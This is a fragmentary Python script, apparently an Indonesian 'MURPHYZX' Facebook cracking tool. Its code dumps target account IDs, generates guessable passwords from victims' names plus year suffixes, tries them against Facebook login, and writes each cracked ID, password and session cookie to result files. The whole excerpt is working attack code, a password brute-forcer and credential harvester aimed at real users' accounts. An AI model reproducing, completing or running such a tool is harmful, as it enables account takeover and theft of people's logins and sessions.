...
{puti}Update   : {biru} MURPHYZX
{puti}Script : {biru}Facebook
{puti}Tools    : {biru}MURPHYZX XD
{puti}Status   : {biru}PREMIUM
{puti}Version  : {biru}2.5.8                                                                                                                                    ''')
#kukis
def login():
	os.system('clear')
	banner()
...
def menu():
	...
	print(f"{kun}╭────────────────────────────────────────────{puti}")
	MURPHYZX_GANTENG = input(f'{kun}└──[{puti} Input menu : ')
	if MURPHYZX_GANTENG in ['01','1']:
	        idt = input('\n└──[ ID Target : ')
	        dump(idt,"",{"cookie":cok},token)
	        atur_id()
	if MURPHYZX_GANTENG in ['02','2']:
	        dump_massal()
	elif MURPHYZX_GANTENG in ['03','3']:
	        hasil_cp()
	elif MURPHYZX_GANTENG in ['04','4']:
	        hasil_ok()
	elif MURPHYZX_GANTENG in ['05','5']:
            ganti_cokies()
...
#----------[ HASIL-OK ]----------#            
def hasil_ok():
	try:vin = os.listdir('MURPHYZX-OK')
	...
	if len(vin)==0:
		...
		try:lin = open('MURPHYZX-OK/'+geh,'r').read().splitlines()
		except:
		    print(f"{kun}╭────────────────────────────────────────────{puti}")
		    exit(f"{kun}└──[{mer} File tidak di temukan ")
		nocp=0
...
#----------[ HASIL-CP]----------#            
def hasil_cp():
	try:vin = os.listdir('MURPHYZX-CP')
	except FileNotFoundError:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		exit(f"{kun}└──[{mer} File tidak di temukan ")
	if len(vin)==0:
		...
		lol = {}
		for isi in vin:
			try:hem = open('MURPHYZX-CP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = '0'+str(cih)
...
def atur_method():
	...
	print(f"{kun}╭────────────────────────────────────────────{puti}") 
	MURPHYZX_METHODE = input(f'{kun}└──[{puti} Input method : ')
	if MURPHYZX_METHODE in ['1','01']:
	   method.append('validate')  
	elif MURPHYZX_METHODE in ['2','02']:
	   method.append('reguler')       
	elif MURPHYZX_METHODE in ['3','03']:
	   method.append('asyinc')
	elif MURPHYZX_METHODE in ['4','04']:
		method.append('b.api')
	else:
		method.append('validate')
	print(f"{kun}╭────────────────────────────────────────────{puti}")
			...
			for _gabutz_ster_ in id2:
				...
				if len(namamu_ku_simpan)<6:
					if len(frestile)<3:
						...
						pwx.append(frestile+'2002')
						pwx.append(frestile+'2003')
						pwx.append(frestile+'2004')
						pwx.append(frestile+'2005')
						pwx.append(frestile+'2006')
						pwx.append('kamu nanya')
		...
		'viewport-width': f'{str(rr(300,999))}',
	     ...
	     'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				open('MURPHYZX-OK/'+'MURPHYZX-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
				open('MURPHYZX-OK/'+'MURPHYZX-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
				break			
				...
				open('MURPHYZX-CP/'+'MURPHYZX-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
				akune.append(idf+'|'+pw)
				ceker(idf,pw)
				cp+=1
				break	
...
'li':re.search('name="li" value="(.*?)"', str(link)).group(1),'email':idf,'pass':pw})
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
				print(f'{kun}{ua}')
				open('MURPHYZXCP/'+'MURPHYZX-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
				akune.append(idf+'|'+pw)
				ceker(idf,pw)
				cp+=1
				break	
...
def crackasyinc(idf,pwx):
  ...
  rc = random.choice
  emot = rc(["🥸",])
  prog.update(des,description=f"\r {emot} (MURPHY ZXASYINC ) (%s OK : {ok} %s) (%s CP : {cp} %s) (%s {loop} %s) "%(hijo,puti,kun,puti,hijo,puti))
  prog.advance(des)
  for pw in pwx:
    try:
